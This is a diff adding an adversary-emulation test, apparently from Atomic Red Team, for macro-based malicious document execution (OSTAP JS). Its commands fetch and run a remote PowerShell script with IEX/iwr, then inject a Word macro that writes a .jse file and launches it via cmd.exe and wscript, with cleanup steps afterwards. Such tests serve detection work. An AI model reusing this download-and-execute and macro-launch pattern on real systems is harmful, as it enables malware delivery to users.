@@ -1,0 +1,23 @@
+#TechniqueName: User Execution: Malicious Link
+#AtomicTestName: OSTAP JS version
+#Language: ps1
+
+#get_prereq_commands
+$msword = New-Object -ComObject word.application
+Stop-Process -Name WINWORD
+
+
+#prereq_commands
+If (Test-Path HKCU:SOFTWARE\Microsoft\Office\16.0) { exit 0 } else { exit 1 }
+
+
+#commands
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+$macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"
+Invoke-MalDoc $macrocode "16.0" "Word"
+
+
+#cleanup_commands
+if (Test-Path C:\Users\Public\art.jse) { Remove-Item C:\Users\Public\art.jse }
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\16.0\Word\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+
